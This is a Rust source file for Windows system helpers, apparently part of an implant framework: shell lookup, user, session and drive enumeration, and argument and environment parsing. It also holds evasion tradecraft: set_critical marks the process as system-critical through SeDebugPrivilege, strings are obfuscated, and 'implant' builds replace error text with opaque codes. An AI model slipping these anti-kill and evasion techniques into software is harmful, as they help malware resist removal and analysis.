// Copyright (C) 2023 iDigitalFlame
//
// This program is free software: you can redistribute it and/or modify
// it under the terms of the GNU General Public License as published by
// the Free Software Foundation, either version 3 of the License, or
// any later version.
//
// This program is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.
//
// You should have received a copy of the GNU General Public License
// along with this program.  If not, see <https://www.gnu.org/licenses/>.
//

#![no_implicit_prelude]
#![cfg(windows)]

use crate::data::blob::Blob;
use crate::data::time::Time;
use crate::device::winapi::SessionHandle;
use crate::device::{fs, winapi, Address, Login};
use crate::util::crypt;
use crate::util::stx::io::{self, Error};
use crate::util::stx::prelude::*;

pub const SHELL_ARGS: [u8; 2] = [b'/', b'c'];

const COM: [u16; 8] = [
    b'\\' as u16,
    b'c' as u16,
    b'm' as u16,
    b'd' as u16,
    b'.' as u16,
    b'e' as u16,
    b'x' as u16,
    b'e' as u16,
];
const COMSPEC: [u16; 7] = [
    b'C' as u16,
    b'o' as u16,
    b'm' as u16,
    b'S' as u16,
    b'p' as u16,
    b'e' as u16,
    b'c' as u16,
];
#[inline]
pub fn shell() -> String {
    // NOTE(dij): I'm not 100% sure if this will be a saved constant or not, as
    //            while yes, it makes one syscall (the 'exists' check, the rest
    //            are ASM), it's pretty "quick" and dynamically resolves the shell
    //            instead of only at runtime. Go saved it at runtime, however I
    //            don't want to save many non-droppable (static) heap items.
    if let Some(p) = winapi::GetEnvironment()
        .iter()
        .find(|v| v.is_key(&COMSPEC))
        .and_then(|d| d.value_as_blob())
        .map(|v| v.to_string())
    {
        if fs::exists(&p) {
            return p;
        }
    }
    winapi::system_dir()
        .iter()
        .chain(COM.iter())
        .map(|v| *v as u8)
        .collect::<Blob<u8, 256>>()
        .to_string()
}
#[inline]
pub fn powershell<'a>() -> &'a str {
    crypt::get_or(0, "powershell.exe")
}
#[inline]
pub fn whoami() -> io::Result<String> {
    winapi::local_user().map_err(Error::from)
}
#[inline]
pub fn hostname() -> io::Result<String> {
    let n = winapi::GetComputerName().map_err(Error::from)?;
    if let Some(i) = n.as_bytes().iter().position(|v| *v == b'.') {
        Ok(n[0..i].to_string())
    } else {
        Ok(n)
    }
}
pub fn logins() -> io::Result<Vec<Login>> {
    let h = SessionHandle::default();
    let s = winapi::WTSGetSessions(&h).map_err(Error::from)?;
    if s.len() == 0 {
        return Ok(Vec::new());
    }
    let mut o = Vec::with_capacity(s.len());
    for i in s {
        if i.status >= 6 && i.status <= 9 {
            continue;
        }
        o.push(Login {
            id:         i.id,
            from:       Address::from(i.addr),
            user:       if i.domain.is_empty() {
                i.user
            } else {
                let mut t = i.domain.clone();
                t.push('\\');
                t.push_str(&i.user);
                t
            },
            host:       i.host,
            status:     i.status,
            last_input: Time::from(i.last_input),
            login_time: Time::from(i.login_time),
        });
    }
    Ok(o)
}
pub fn mounts() -> io::Result<Vec<String>> {
    let d = winapi::GetLogicalDrives().map_err(Error::from)?;
    let mut o = Vec::new();
    o.reserve_exact(26);
    for i in 0..26 {
        if (d & (1 << i)) == 0 {
            continue;
        }
        let mut b = String::new();
        let t = unsafe { b.as_mut_vec() };
        t.push(b'A' + i);
        t.extend_from_slice(&[b':', b'\\']);
        o.push(b);
    }
    Ok(o)
}
#[inline]
pub fn set_critical(is_critical: bool) -> io::Result<bool> {
    winapi::acquire_privilege(winapi::SE_DEBUG_PRIVILEGE).map_err(Error::from)?;
    winapi::RtlSetProcessIsCritical(is_critical).map_err(Error::from)
}

pub mod env {
    use alloc::vec::IntoIter;
    use core::error::Error;
    use core::fmt::{self, Debug, Display, Formatter};

    use crate::device::winapi;
    use crate::util::crypt;
    use crate::util::stx::ffi::{OsStr, OsString, PathBuf};
    use crate::util::stx::io;
    use crate::util::stx::prelude::*;

    pub struct VarError;
    pub struct Args(ArgsOs);
    pub struct Vars(VarsOs);
    pub struct JoinPathsError;

    pub type ArgsOs = IntoIter<OsString>;
    pub type SplitPaths = IntoIter<PathBuf>;
    pub type VarsOs = IntoIter<(OsString, OsString)>;

    impl Error for VarError {
        #[inline]
        fn cause(&self) -> Option<&dyn Error> {
            None
        }
        #[inline]
        fn source(&self) -> Option<&(dyn Error + 'static)> {
            None
        }
    }
    impl Debug for VarError {
        #[inline]
        fn fmt(&self, f: &mut Formatter<'_>) -> fmt::Result {
            Display::fmt(self, f)
        }
    }
    impl Display for VarError {
        #[inline]
        fn fmt(&self, f: &mut Formatter<'_>) -> fmt::Result {
            f.write_str(if cfg!(feature = "implant") {
                "0x404"
            } else {
                "var not present"
            })
        }
    }

    impl Error for JoinPathsError {
        #[inline]
        fn cause(&self) -> Option<&dyn Error> {
            None
        }
        #[inline]
        fn source(&self) -> Option<&(dyn Error + 'static)> {
            None
        }
    }
    impl Debug for JoinPathsError {
        #[inline]
        fn fmt(&self, f: &mut Formatter<'_>) -> fmt::Result {
            Display::fmt(self, f)
        }
    }
    impl Display for JoinPathsError {
        #[inline]
        fn fmt(&self, f: &mut Formatter<'_>) -> fmt::Result {
            f.write_str(if cfg!(feature = "implant") {
                "0x400"
            } else {
                "bad path value"
            })
        }
    }

    impl Iterator for Args {
        type Item = String;

        #[inline]
        fn next(&mut self) -> Option<String> {
            self.0.next().map(|v| v.to_string_lossy().to_string())
        }
        #[inline]
        fn size_hint(&self) -> (usize, Option<usize>) {
            self.0.size_hint()
        }
    }
    impl ExactSizeIterator for Args {
        #[inline]
        fn len(&self) -> usize {
            self.0.len()
        }
    }

    impl Iterator for Vars {
        type Item = (String, String);

        #[inline]
        fn size_hint(&self) -> (usize, Option<usize>) {
            self.0.size_hint()
        }
        #[inline]
        fn next(&mut self) -> Option<(String, String)> {
            self.0.next().map(|(a, b)| {
                (
                    a.to_string_lossy().to_string(),
                    b.to_string_lossy().to_string(),
                )
            })
        }
    }
    impl ExactSizeIterator for Vars {
        #[inline]
        fn len(&self) -> usize {
            self.0.len()
        }
    }

    #[inline]
    pub fn args() -> Args {
        Args(args_os())
    }
    #[inline]
    pub fn vars() -> Vars {
        Vars(vars_os())
    }
    #[inline]
    pub fn args_os() -> ArgsOs {
        split_args(&winapi::GetCommandLine()).into_iter()
    }
    #[inline]
    pub fn vars_os() -> VarsOs {
        winapi::GetEnvironment().entries().into_iter()
    }
    #[inline]
    pub fn temp_dir() -> PathBuf {
        winapi::GetTempPath()
            .unwrap_or_else(|_| var(crypt::get_or(0, "TEMP")).unwrap_or_default())
            .into()
    }
    #[inline]
    pub fn home_dir() -> Option<PathBuf> {
        if let Ok(s) = var(crypt::get_or(0, "USERPROFILE")) {
            return Some(s.into());
        }
        // 0x20008 - TOKEN_READ | TOKEN_QUERY
        winapi::current_token(0x20008)
            .and_then(|t| winapi::GetUserProfileDirectory(t))
            .map_or(None, |v| Some(v.into()))
    }
    #[inline]
    pub fn remove_var(key: impl AsRef<OsStr>) {
        // IGNORE ERROR
        let _ = winapi::SetEnvironmentVariable(key.as_ref().to_string_lossy(), None);
    }
    #[inline]
    pub fn current_dir() -> io::Result<PathBuf> {
        Ok(winapi::GetCurrentDirectory().into())
    }
    #[inline]
    pub fn current_exe() -> io::Result<PathBuf> {
        winapi::GetModuleFileName(winapi::INVALID)
            .map(|v| v.into())
            .map_err(io::Error::from)
    }
    pub fn split_args(a: &str) -> Vec<OsString> {
        let mut o = Vec::new();
        let (mut l, mut d, mut s) = (0, false, false);
        let b = a.as_bytes();
        for (i, x) in b.iter().enumerate() {
            match *x {
                b'"' if i > 0 && backup(b, i) => (),
                b'"' if !s && i > 0 && b[i - 1] == b'\\' && !backup(b, i) => d = !d,
                b'"' if i + 1 < b.len() && b[i + 1] == b'"' => (),
                b'"' if !d && !s => d = true,
                b'"' if d && !s => d = false,
                b'\'' if !s && !d => s = true,
                b'\'' if s && !d => s = false,
                b' ' if d => (),
                b' ' => {
                    if i - l > 0 {
                        o.push(collapse(&b[l..i]))
                    }
                    l = i + 1;
                },
                _ => (),
            }
        }
        if l == 0 {
            o.push(collapse(b));
        } else if l < b.len() {
            o.push(collapse(&b[l..]));
        }
        o
    }
    #[inline]
    pub fn var_os(key: impl AsRef<OsStr>) -> Option<OsString> {
        winapi::GetEnvironmentVariable(key.as_ref().to_string_lossy()).and_then(|v| Some(v.into()))
    }
    #[inline]
    pub fn var(key: impl AsRef<OsStr>) -> Result<String, VarError> {
        winapi::GetEnvironmentVariable(key.as_ref().to_string_lossy()).map_or(Err(VarError), |v| Ok(v))
    }
    #[inline]
    pub fn set_var(key: impl AsRef<OsStr>, value: impl AsRef<OsStr>) {
        // IGNORE ERROR
        let _ = winapi::SetEnvironmentVariable(
            key.as_ref().to_string_lossy(),
            value.as_ref().to_string_lossy(),
        );
    }
    #[inline]
    pub fn set_current_dir(path: impl AsRef<OsStr>) -> io::Result<()> {
        winapi::SetCurrentDirectory(&path.as_ref().to_string_lossy()).map_err(io::Error::from)
    }
    pub fn split_paths<T: AsRef<OsStr> + ?Sized>(paths: &T) -> SplitPaths {
        let v = &*paths.as_ref().to_string_lossy();
        let (mut o, mut l, mut d) = (Vec::new(), 0, false);
        for (i, x) in v.as_bytes().iter().enumerate() {
            match *x {
                b'"' if !d => d = true,
                b'"' => d = false,
                b';' if d => (),
                b';' => {
                    if i - l > 0 {
                        o.push(PathBuf::from(&v[l..i]))
                    }
                    l = i + 1;
                },
                _ => (),
            }
        }
        if l == 0 {
            o.push(v.into());
        } else if l < v.len() {
            o.push(PathBuf::from(&v[l..]));
        }
        o.into_iter()
    }
    pub fn join_paths<T: AsRef<OsStr>>(paths: impl IntoIterator<Item = T>) -> Result<OsString, JoinPathsError> {
        let mut b = String::new();
        for (i, v) in paths.into_iter().enumerate() {
            let d = v.as_ref().to_string_lossy();
            if d.contains('"') {
                return Err(JoinPathsError);
            }
            if i > 0 {
                b.push(';');
            }
            b.reserve(d.len() + 1);
            if !d.contains(';') {
                b.push_str(&*d);
                continue;
            }
            b.push('"');
            b.push_str(&*d);
            b.push('"');
        }
        Ok(b.into())
    }

    fn collapse(v: &[u8]) -> OsString {
        let mut c = 0;
        let mut b = String::with_capacity(v.len());
        let x = unsafe { b.as_mut_vec() };
        for (i, t) in v.iter().enumerate() {
            match *t {
                b'"' if i > 0 && v[i - 1] == b'\\' => {
                    if c > 1 {
                        for _ in 0..(c / 2) {
                            x.push(b'\\');
                        }
                    }
                    if c == 1 || c % 2 == 1 {
                        x.push(b'"');
                    }
                    c = 0;
                },
                b'"' if i > 0 && v[i - 1] == b'"' => (),
                b'"' if i + 1 == v.len() || v[i + 1] != b'"' => (),
                b'\\' => c += 1,
                _ => {
                    if c > 0 {
                        for _ in 0..c {
                            x.push(b'\\');
                        }
                        c = 0;
                    }
                    x.push(*t);
                },
            }
        }
        if c > 0 {
            b.extend((0..c).map(|_| '\\'));
        }
        b.into()
    }
    fn backup(buf: &[u8], pos: usize) -> bool {
        if buf[pos - 1] != b'\\' {
            return false;
        }
        if pos <= 2 {
            return true;
        }
        let mut c = 0;
        for i in (0..pos - 2).rev() {
            if buf[i] != b'\\' {
                break;
            }
            c += 1;
        }
        c == 0 || c % 2 == 1
    }
}
